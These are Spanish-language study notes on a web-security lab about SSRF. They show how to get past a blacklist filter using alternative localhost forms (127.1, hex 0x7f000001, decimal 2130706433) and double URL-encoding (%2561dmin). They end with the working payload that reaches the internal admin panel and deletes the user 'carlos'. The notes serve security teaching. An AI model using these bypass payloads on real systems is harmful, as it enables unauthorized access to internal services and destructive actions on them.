
En esta clase continuamos con la explotación de SSRF, centrándonos en cómo evadir defensas basadas en listas negras. La aplicación impide directamente ciertas direcciones como 127.0.0.1 y rutas sensibles como /admin, pero estas restricciones son débiles.

Utilizamos técnicas de evasión como redirecciones a direcciones IP alternativas (por ejemplo, 127.1) y codificación doble de caracteres (%2561 en lugar de a) para engañar al filtro. Gracias a esto conseguimos acceder al panel de administración interno y eliminar al usuario carlos, demostrando que los controles basados únicamente en listas negras no son una protección fiable contra SSRF.

-----

1. Debemos de Bypassear al intentar poner la URL de la pagina
2. Nos vamos al apartado de check stock
3. Podemos poner lo siguiente

http://localhost/
http://127.0.0.1/
http://127.12.3.12/ -> Podemos poner el valor que sea en los 3 ultima octetos de la IP y será lo mismo
http://127.0.1/ -> sigue haciendo lo mismo al localhost
http://127.1/ -> sigue haciendo lo mismo al localhost

Decimal to Hexadecimal

Y convertimos los valores de decimal a hexadecimal para representar los valores de localhost 127.0.0.1

Entonces podemos hacer lo sigueinte

ping -c 1 0x7f000001

http://0x7f000001/
http://0x7f000002/
http://0x7f000003/

Tambien  podemos pasar el valor de la IP a Decimal, para ellos hacemos lo siguiente:

127.0.0.1

    1->1*256^0
    0->0*256^1 = 0
    0->0*256^2 = 0
    127->127*256^3

Entonces lo podemos hacer con Linux:

    echo "1->1*256^0 + 127*256^3" | bc
    >2130706433
    
Entonces podemos hacer la consulta hacia esto:

http://2130706433/ -> y es lo mismo que hacerlo a Localhost (127.0.0.1)

Ahora vemos que la cadena "admin" tambien está siendo bloqueada, entonces podemos representar la letra "a" en doble URL, urlencodeamos el % 2 veces

%61 -> a
%2561 -> a

Entonces probamos la consultar:

http://127.1/%2561dmin

Y podemos ver el panela de administracion y eliminamos a carlos

http://127.1/%2561dmin/delete?username=carlos

